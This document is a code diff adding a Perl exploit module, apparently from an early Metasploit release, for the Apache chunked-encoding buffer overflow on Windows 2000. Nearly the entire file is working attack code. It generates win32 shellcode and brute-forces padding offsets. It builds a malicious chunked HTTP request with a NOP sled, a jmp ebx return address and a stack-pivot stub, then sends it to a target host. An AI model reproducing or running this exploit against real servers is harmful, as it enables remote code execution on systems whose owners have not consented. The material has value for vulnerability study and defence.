@@ -1,0 +1,273 @@
+use IO::Socket;
+use Pex;
+
+##
+#
+$Name = "Apache Chunked Encoding (Win2k)";
+$Version = "1.0";
+$Author = "H D Moore";
+$URL = "http://www.metasploit.com/";
+$Group = "Apache";
+$Description = "This exploits the chunked encoding bug found in Apache versions ".
+               "1.2.x to 1.3.24. This particular module will only work reliably ".
+               "against versions 1.3.17 on up running on Windows 2000. The BRUTE ".
+               "option may be effective against systems that are running any ".
+               "third-party modules, their existence will change the location ".
+               "in the buffer that overwrites the return address. This exploit ".
+               "may complelely crash certain versions of Apache shipped with ".
+               "Oracle and various web application frameworks. " .
+               "Please see the following URL for more information on this ".
+               "vulnerability.\n\n".
+               "http://lists.insecure.org/lists/bugtraq/2002/Jun/0184.html";        
+#
+##
+
+my $pex = Pex->new();
+my $pay = {};
+
+sub Init {
+    my ($obj) = @_;
+    $obj->NeedPayload(1);
+    $obj->Payloads();
+}
+
+sub Payloads {
+    my ($obj, $opt) = @_;
+    my $x = $pex->Payloads();
+    
+    # win32 exploit, load the payloads
+    my $wincode = $x->{"x86"}->{"win32"};
+    foreach my $s (keys(%{ $wincode }))
+    {
+        my $name = $wincode->{$s}->{"NAME"};
+        $pay->{$name} = $wincode->{$s};
+    }
+     
+    return $pay;
+}
+
+sub Check {
+    my ($obj, $opt) = @_;
+    return "No vulnerability check has been implemented for this module.";
+}
+
+sub Options {
+    my ($obj, $payload) = @_;
+    my $res = {};
+    
+    $res->{"RHOST"} = [1, "The target system's ip address."];
+    $res->{"RPORT"} = [1, "The port that Apache is running on."];
+    $res->{"BRUTE"} = [0, "Enable brute force mode."];
+    
+    
+    foreach my $popt (keys (%{ $pay->{$payload}->{"ARGS"} }))
+    {
+        $res->{$popt} = $pay->{$payload}->{"ARGS"}->{$popt};
+    }
+    return $res;
+}
+
+
+sub SetupPayload {
+    my ($opt) = @_;
+
+    my $payload = $pay->{$opt->{"PAYLOAD"}};
+    my (undef, $parch, $pos, $pname) = split(/\_/, $payload->{"METH"});
+    if (! $pname)
+    {
+        print "[*] No such payload exists.\n";
+        return(undef);
+    }
+    
+    print "[*] Generating payload " . $opt->{"PAYLOAD"} . " ($parch, $pos, $pname)...\n";
+    
+    my $shellcode = $pex->EasySC("\x00+&=%\x0a\x0d\x20", 8100, $parch, $pos, $pname, $opt);
+
+    if ($shellcode)
+    {
+        print "[*] Payload generation complete (" . length($shellcode) . " bytes)\n";
+    } else {
+        print "[*] Error generating payload: " . $pex->Error() . "\n";
+        return(undef);
+    }
+
+    my $listener;
+    my $handler = $payload->{"SHELL"};
+      
+    if ($handler)
+    { 
+        $listener = $pex->$handler($opt);
+        if ($listener == 0) { return undef }
+        return ($shellcode, $listener);
+    }
+    
+    # other payloads fork to maintain compatibility
+    $listener = $$;
+    my $exploit = fork();
+    if (! $exploit) { return ($shellcode, $listener) }
+    while (waitpid($exploit, WNOHANG) == 0) { sleep(1) }
+    return(undef);
+
+}
+
+
+sub Exploit {
+    my ($obj, $opt) = @_;
+    
+    my %targets = 
+    (
+        "Apache/1.3.14"    => [360],
+        "Apache/1.3.17"    => [360],    
+        "Apache/1.3.19"    => [360, 252],
+        "Apache/1.3.20"    => [360],
+        "Apache/1.3.22"    => [352],
+        "Apache/1.3.23"    => [356],
+        "Apache/1.3.24"    => [360, 356, 244],
+    );
+
+    select(STDOUT);$|++;
+
+    my $target_host = $opt->{"RHOST"};
+    my $target_port = $opt->{"RPORT"};
+
+    # call ebx in Win9xConsoleHook.dll 
+    my @jmps = ( 0x1c0f143c );
+    
+    # create the payload
+    my ($shellcode, $listener) = SetupPayload($opt);
+    if (! defined($shellcode)) { return; }
+   
+    # build the target set
+    my @target_pile;
+    
+    if (! $opt->{"BRUTE"})
+    {
+        # single target mode, determined by server banner 
+        
+        my @pads;
+        if (! $target_pads)
+        {
+            my $header = $pex->GetHead($target_host, $target_port);
+            if (! $header) { exit(0) }
+            
+            foreach (keys(%targets))
+            {
+                if ($header =~ /$_ /)
+                {
+                    $target_pads = $targets{$_}->[0];
+                    print "[*] Using padding size of $target_pads for server: $header\n";
+                }
+            }
+
+            if (! $target_pads)
+            {
+                print "[*] Using default padding size of 360 for server: $header\n";
+                $target_pads = 360;
+            }
+        }
+
+        push @target_pile, [$target_pads, $jmps[0]]; 
+    } else {
+    
+        # brute force mode, try them all
+        
+        my @pads;
+        my $pad;
+        my $jmp;
+
+        # add the most common values first
+        for ($pad = 348; $pad < 368; $pad += 4) { push @pads, $pad }
+        for ($pad = 200; $pad < 348; $pad += 4) { push @pads, $pad }
+        for ($pad = 360; $pad < 400; $pad += 4) { push @pads, $pad }
+
+        foreach $jmp (@jmps)
+        {
+            foreach $pad (@pads)
+            {
+                 push @target_pile, [$pad, $jmps[0]]; 
+            }
+        }
+
+        print "[*] Trying brute force mode with " . scalar(@target_pile) . " possible targets.\n";
+    }
+
+    foreach $target (@target_pile)
+    {
+        my $request = BuildRequest($target_host, $target_port, $shellcode, $target->[1], $target->[0]);
+        print "[*] Exploit request is " . length($request) . " bytes\n";
+        if (! AttemptExploit($target_host, $target_port, $request) ) { exit(0) }
+    }
+    exit(0);  
+}
+
+
+
+sub BuildRequest {
+    my ($host, $port, $scode, $jmp_ebx, $pad, $scsz) = @_;
+    my $request;
+    my $res;
+    my $srv;
+    
+    if (! $pad)
+    {
+        print "[*] Error, invalid pad size of 0 used\n";
+        exit(0);
+    }
+    
+    printf("[*] Using %d bytes of padding with jmp address 0x%.8x\n", $pad, $jmp_ebx);
+
+    $request  = "GET / HTTP/1.1\r\n";
+    $request .= "Host: $host:$port\r\n";
+    $request .= "Transfer-Encoding: CHUNKED\r\n";
+    $request .= "\r\n";
+    $request .= "DEADBEEF ";
+
+    # large nop sled plus shellcode
+    $request .= $scode . "\r\n";
+
+    # these three bytes are for address alignment
+    $request .= "PAD";  
+    
+    # place the appropriate amount of padding
+    $request .= ("O" x $pad);
+
+    # this is where ebx points, make it jump over the return address
+    $request .= "XX" . "\xeb\x04\xeb\x04";  
+
+    # this is the return address, it needs to point to a valid "jmp ebx" instruction
+    $request .= pack("l", $jmp_ebx);
+
+    # a mini nop sled for the short jmp to land in
+    $request .= ("\x90\x90\x90\x90" x 4);
+
+    # add 1300 to esp to hurdle into the nop sled before the shellcode
+    $request .= "\x81\xc4\x14\x05\x00\x00";  # add esp, 1300
+    $request .= "\xff\xe4";                  # jmp esp
+
+    return $request;
+}
+
+sub AttemptExploit {
+    my ($host, $port, $request) = @_;
+    my $s = IO::Socket::INET->new (
+                Proto => "tcp",
+                PeerAddr => $host,
+                PeerPort => $port,
+                Type => SOCK_STREAM
+    );
+    
+    if (! $s)
+    {
+        print "[*] Error, could not connect to $host:$port.\n";
+        return(0);
+    }
+    
+    select($s); $|++;
+    select(STDOUT);
+    
+    print "[*] Sending " . length($request) . " bytes to remote host.\n";
+    print $s $request;
+    sleep(2);
+    close($s);
+    return(1);
+}
